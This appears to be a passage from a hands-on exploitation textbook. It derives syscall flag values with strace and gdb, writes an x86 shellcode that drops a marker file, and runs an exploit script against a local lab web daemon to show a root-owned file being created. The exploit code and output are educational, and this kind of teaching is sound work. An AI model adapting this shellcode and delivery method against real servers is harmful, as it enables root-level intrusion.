Complex exploits are difficult because so many different things can go wrong, with no indication of the root cause
Since it can take hours just to track down where the error occured, it's usually better to break a complex exploit down into smaller parts
The end goal is a piece of shellcode that will spawn a shell yet keep the tinyweb running
The shell is interactive, which causes some complications, so let's deal with that later
For now, the first step should be figuring out how to put the tinyweb daemon back together after exploiting it
Let's begin by writing a piece of shellcode that does something to prove it ran and then puts the tinyweb daemon back together so it can process further web requests

Since the tinyweb daemon redirects standard out to /dev/null, writing to standard out isn't a reliable marker for shellcode
One simple way to prove the shellcode ran is to create a file
This can be done by making a call to open(), and then close()
Of course, the open() call will need the appropriate flags to create a file
We could look through include files to figure out what O_CREAT and all the other necessary defines actually are and do all the bitwise math for the arguments, but that's sort of a pain in the ass
If you recall, we've done something like this already-- the notetaker program makes a call to open() which will create a file if it didn't exist
The strace program can be used on any program to show every system call it makes
In the output below, this is used to verify that the arguments to open() in C match up with the raw system calls

__________________________________________________________________________________
reader@hacking:~/booksrc $ strace ./notetaker test
execve("./notetaker", ["./notetaker", "test"], [/* 27 vars */]) = 0
brk(0)                                  = 0x804a000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe5000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=70799, ..}) = 0
mmap2(NULL, 70799, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd3000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0`\1\000".., 512) = 512
fstat64(3, {st_mode=S_IFREG|0644, st_size=1307104, ..}) = 0
mmap2(NULL, 1312164, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e92000
mmap2(0xb7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13b) =
0xb7fcd000
mmap2(0xb7fd0000, 9636, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd0000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e91000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e916c0, limit:1048575, seg_32bit:1,
contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcd000, 4096, PROT_READ)   = 0
munmap(0xb7fd3000, 70799)               = 0
brk(0)                                  = 0x804a000
brk(0x806b000)                          = 0x806b000
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe4000
write(1, "[DEBUG] buffer   @ 0x804a008: \'t".., 37[DEBUG] buffer   @ 0x804a008: 'test') = 37
write(1, "[DEBUG] datafile @ 0x804a070: \'/".., 43[DEBUG] datafile @ 0x804a070: '/var/notes') = 43

   open("/var/notes", O_WRONLY|O_APPEND|O_CREAT, 0600) = -1 EACCES (Permission denied)

dup(2)                                  = 3
fcntl64(3, F_GETFL)                     = 0x2 (flags O_RDWR)
fstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe3000
_llseek(3, 0, 0xbffff4e4, SEEK_CUR)     = -1 ESPIPE (Illegal seek)
write(3, "[!!] Fatal Error in main() while".., 65[!!] Fatal Error in main() while opening file: Permission denied) = 65
close(3)                                = 0
munmap(0xb7fe3000, 4096)                = 0
exit_group(-1)                          = ?
Process 21473 detached

reader@hacking:~/booksrc $ grep open notetaker.c
         fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
                fatal("in main() while opening file");
__________________________________________________________________________________

When run through strace, the notetaker binary's suid-bit isn't used, so it doesn't have any permission to open the data file
That doesn't matter, though; we just want to make sure the arguments to the open() system call match the arguments to the open() call in C
Since they match, we can safely use the values passed to the open() function in the notetaker binary as the argument for the open() system call in our shellcode
The compiler has already done all the work of looking up the defines and mashing them together with a bitwise OR operation; we just need to find the call arguments in the disassembly of the notetaker binary

__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q ./notetaker
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) set dis intel

(gdb) disass main
Dump of assembler code for function main:
0x0804875f <main+0>:    push  ebp 
0x08048760 <main+1>:    mov   ebp,esp 
0x08048762 <main+3>:    sub   esp,0x28 
0x08048765 <main+6>:    and   esp,0xfffffff0 
0x08048768 <main+9>:    mov   eax,0x0 
0x0804876d <main+14>:   sub   esp,eax 
0x0804876f <main+16>:   mov   DWORD PTR [esp],0x64 
0x08048776 <main+23>:   call  0x8048601 <ec_malloc> 
0x0804877b <main+28>:   mov   DWORD PTR [ebp-12],eax 
0x0804877e <main+31>:   mov   DWORD PTR [esp],0x14 
0x08048785 <main+38>:   call  0x8048601 <ec_malloc> 
0x0804878a <main+43>:   mov   DWORD PTR [ebp-16],eax 
0x0804878d <main+46>:   mov   DWORD PTR [esp+4],0x8048a9f 
0x08048795 <main+54>:   mov   eax,DWORD PTR [ebp-16] 
0x08048798 <main+57>:   mov   DWORD PTR [esp],eax 
0x0804879b <main+60>:   call  0x8048480 <strcpy@plt> 
0x080487a0 <main+65>:   cmp   DWORD PTR [ebp+8],0x1 
0x080487a4 <main+69>:   jg    0x80487ba <main+91> 
0x080487a6 <main+71>:   mov   eax,DWORD PTR [ebp-16] 
0x080487a9 <main+74>:   mov   DWORD PTR [esp+4],eax 
0x080487ad <main+78>:   mov   eax,DWORD PTR [ebp+12] 
0x080487b0 <main+81>:   mov   eax,DWORD PTR [eax] 
0x080487b2 <main+83>:   mov   DWORD PTR [esp],eax 
0x080487b5 <main+86>:   call  0x8048733 <usage> 
0x080487ba <main+91>:   mov   eax,DWORD PTR [ebp+12] 
0x080487bd <main+94>:   add   eax,0x4 
0x080487c0 <main+97>:   mov   eax,DWORD PTR [eax] 
0x080487c2 <main+99>:   mov   DWORD PTR [esp+4],eax 
0x080487c6 <main+103>:  mov   eax,DWORD PTR [ebp-12] 
0x080487c9 <main+106>:  mov   DWORD PTR [esp],eax 
0x080487cc <main+109>:  call  0x8048480 <strcpy@plt> 
0x080487d1 <main+114>:  mov   eax,DWORD PTR [ebp-12] 
0x080487d4 <main+117>:  mov   DWORD PTR [esp+8],eax 
0x080487d8 <main+121>:  mov   eax,DWORD PTR [ebp-12] 
0x080487db <main+124>:  mov   DWORD PTR [esp+4],eax 
0x080487df <main+128>:  mov   DWORD PTR [esp],0x8048aaa 
0x080487e6 <main+135>:  call  0x8048490 <printf@plt> 
0x080487eb <main+140>:  mov   eax,DWORD PTR [ebp-16]
0x080487ee <main+143>:  mov   DWORD PTR [esp+8],eax 
0x080487f2 <main+147>:  mov   eax,DWORD PTR [ebp-16] 
0x080487f5 <main+150>:  mov   DWORD PTR [esp+4],eax 
0x080487f9 <main+154>:  mov   DWORD PTR [esp],0x8048ac7 
0x08048800 <main+161>:  call  0x8048490 <printf@plt> 

      0x08048805 <main+166>:  mov   DWORD PTR [esp+8],0x180 
      0x0804880d <main+174>:  mov   DWORD PTR [esp+4],0x441 
      0x08048815 <main+182>:  mov   eax,DWORD PTR [ebp-16] 
      0x08048818 <main+185>:  mov   DWORD PTR [esp],eax 
      0x0804881b <main+188>:  call  0x8048410 <open@plt> 

---Type <return> to continue, or q <return> to quit---q
Quit
__________________________________________________________________________________

Remember that the arguments to a function will be pushed to the stack in reverse
In this case, the compiler decided to use 
   mov DWORD PTR [esp+offset], value_to_push_to_stack
instead of push instructions, but the structure built on the stack is equivalent
The first argument is a pointer to the name of the file in EAX, the second argument (put at [esp+4]) is 0x441, and the third argument (put at [esp+8]) is 0x180
This means that O_WRONLY|O_CREAT|O_APPEND turns out to be 0x441 and S_IRUSR|S_IWUSR is 0x180
The following shellcode uses these values to create a file called Hacking in the root filesystem

mark.s
__________________________________________________________________________________
BITS 32
; Mark the filesystem to prove you ran
   jmp short one
   two:
   pop ebx              ; Filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; Null terminate filename
   push BYTE 0x5        ; Open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; Open file to create it.
      ; eax = returned file descriptor
   mov ebx, eax         ; File descriptor to second arg
   push BYTE 0x6        ; Close()
   pop eax 
   int 0x80  ; Close file

   xor eax, eax
   mov ebx, eax
   inc eax     ; Exit call
   int 0x80    ; Exit(0), to avoid an infinite loop
one:
   call two
db "/HackedX"
;  01234567
__________________________________________________________________________________

The shellcode opens a file to create it and then immediately closes the file
Finally, it calls exit to avoid an infinite loop
The output below shows this new shellcode being used with the exploit tool

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./tinywebd
Starting tiny web daemon.

reader@hacking:~/booksrc $ nasm mark.s
reader@hacking:~/booksrc $ hexdump -C mark
00000000 eb 23 5b 31 c9 88 4b 07 6a 05 58 66 b9 41 04 31 |.#[1.K.j.Xf.A.1|
00000010 d2 66 ba 80 01 cd 80 89 c3 6a 06 58 cd 80 31 c0 |.f....j.X.1.|
00000020 89 c3 40 cd 80 e8 d8 ff ff ff 2f 48 61 63 6b 65 |.@..../Hacke|
00000030 64 58                                           |dX|
00000032

reader@hacking:~/booksrc $ ls -l /Hacked
ls: /Hacked: No such file or directory

reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark 127.0.0.1
target IP: 127.0.0.1
shellcode: mark (44 bytes)
fake request: "GET / HTTP/1.1\x00" (15 bytes)
[Fake Request (15 b)] [NOP (357 b)] [shellcode (44 b)] [ret addr (128 b)]
localhost [127.0.0.1] 80 (www) open

reader@hacking:~/booksrc $ ls -l /Hacked
-rw------- 1 root reader 0 2007-09-17 16:59 /Hacked
__________________________________________________________________________________
